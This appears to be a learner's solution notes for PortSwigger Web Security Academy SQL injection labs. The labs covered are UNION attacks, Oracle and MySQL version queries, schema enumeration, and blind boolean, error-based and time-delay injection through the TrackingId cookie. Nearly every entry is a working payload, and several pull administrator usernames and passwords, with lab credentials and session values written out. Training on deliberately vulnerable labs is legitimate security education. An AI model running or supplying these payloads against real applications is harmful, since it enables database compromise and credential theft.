[lab: SQL injection UNION attack, retrieving multiple values in a single column]
url: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
solution: https://ac981f241f895a09809e911400b6010f7.web-security-academy.net/filter?category=Corporate+gifts' union select null,username || '<->'|| password from users--

[lab: SQL injection attack, querying the database type and version on Oracle]
url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
solution: https://acb51f961f942ea980fa01b60065006d.web-security-academy.net/filter?category=Corporate+gifts' UNION SELECT null,banner FROM v$version--

[lab: SQL injection attack, querying the database type and version on MySQL and Microsoft]
url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
solution: https://acc51f671f380132802638e500580053.web-security-academy.net/filter?category=Corporate+gifts' union select @@version,null%23

[lab: SQL injection attack, listing the database contents on non-Oracle databases]
help: https://www.youtube.com/watch?v=nq3KTL3Cnog
url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
solution: 
  step-1: https://ac1a1fa91e4619b8807040ee00fb0030.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories' order by 2--
  step-2: https://ac1a1fa91e4619b8807040ee00fb0030.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories' union select null,null--
  step-3: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select table_name,null from information_schema.tables--
  step-4: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select column_name,null from information_schema.columns where table_name='users_jxwhjs'--
  step-5: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select username_kivqza,password_vsfmuo from users_jxwhjs--

[lab: SQL injection attack, listing the database contents on Oracle]
url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
solution: 
  step-1: https://aca91fdd1f394b2580ca02b80004002f.web-security-academy.net/filter?category=Corporate+gifts' order by 1--
  step-2: https://aca91fdd1f394b2580ca02b80004002f.web-security-academy.net/filter?category=Corporate+gifts' order by 2--
  step-3: https://aca91fdd1f394b2580ca02b80004002f.web-security-academy.net/filter?category=Corporate+gifts' union select null,null from dual--
  step-4: https://aca91fdd1f394b2580ca02b80004002f.web-security-academy.net/filter?category=Corporate+gifts' union select table_name,null from all_tables--
  step-5: https://aca91fdd1f394b2580ca02b80004002f.web-security-academy.net/filter?category=Corporate+gifts' union select column_name,null from all_tab_columns where table_name = 'USERS_FNOBMQ'--
  step-6: https://aca91fdd1f394b2580ca02b80004002f.web-security-academy.net/filter?category=Corporate+gifts' union select USERNAME_CGUMVU,PASSWORD_MMEGGB from USERS_FNOBMQ--
  step-7: login with credentials (administrator, sn0pc7sw3jlqzgjsnhvz)

[lab: Blind SQL injection with conditional responses]
url: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
solution:
  (using resend request)
  step-1: Cookie: TrackingId=' union select '45' where 1=1--; session=PDcgX0hdZLCWJsZZey7nUz6UZZSwWjli
  step-2: Cookie: TrackingId=' union select '45' from users where username='administrator' and substring(password,1,1) < 'a'--; session=PDcgX0hdZLCWJsZZey7nUz6UZZSwWjli
  step-3: Cookie: TrackingId=' union select '45' from users where username='administrator' and substring(password,1,1) < 'A'--; session=PDcgX0hdZLCWJsZZey7nUz6UZZSwWjli
  step-4: Cookie: TrackingId=' union select '45' from users where username='administrator' and substring(password,1,1) < '0'--; session=PDcgX0hdZLCWJsZZey7nUz6UZZSwWjli
  step-5: using burp intruder for substring(password,<N>,1) with N=1...20
          Cookie: TrackingId=' union select '45' from users where username='administrator' and substring(password,1,1)='ยง0ยง'--; session=PDcgX0hdZLCWJsZZey7nUz6UZZSwWjli

  (note: password will change after session expires, and will be unique for each lab-access. It is therefore necessary to use burp intruder to find the password before the session expires)
  password: haoznk6b9o5m05yvk5me

[lab: Blind SQL injection with conditional errors]
url: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
solution: (using burp suite intruder) (note: I had to look at the solution help for this 
                                             one because I wasn't initially seeing any noticable
                                             differences in my responses. It turned out I was using 
                                             'substring' instead 'substr', which was a critical error
                                             since the DB turned out to be an Oracle DB. One question I now
                                             have after completing this exercise is how would one conduct a blind-
                                             SQL injection without knowing the version of the database, which it seems
                                             would be difficult to determine if the database does not return results in the response.)
  step-1: TrackingId=' union select case when (username='administrator' and substr(password,1,1)='ยง0ยง') then to_char(1/0) else null end from users--
  step-2: identify response with length == 98 bytes, which will correspond to the conditional evaluating to true.
  step-3: repeat step 1, updating substr(password,<N>,1) for N =1...20

  (note: password will change after session expires, and will be unique for each lab-access. It is therefore necessary to use burp intruder to find the password before the session expires)
  password: 1mqhpjsgaib9671ahy4z

[lab: Blind SQL injection with time delays]
url: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
solution: (note: had to look at solution help to realize that the '||' was needed and not 'union select')
  step-1: TrackingId='||case when ((select count(username) from users where username='administrator' and substring(password,1,1) > '0') = 1) then pg_sleep(9) else pg_sleep(0) end--

[lab: Blind SQL injection with time delays and information retrieval]
url: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
solution: same as previous lab, but for substring(password,n,1) for N = 1...20
  step-1: TrackingId='||case when ((select count(username) from users where username='administrator' and substring(password,1,1) > '0') = 1) then pg_sleep(9) else pg_sleep(0) end--

  password: cbukmt7h2fsoa5rocl19

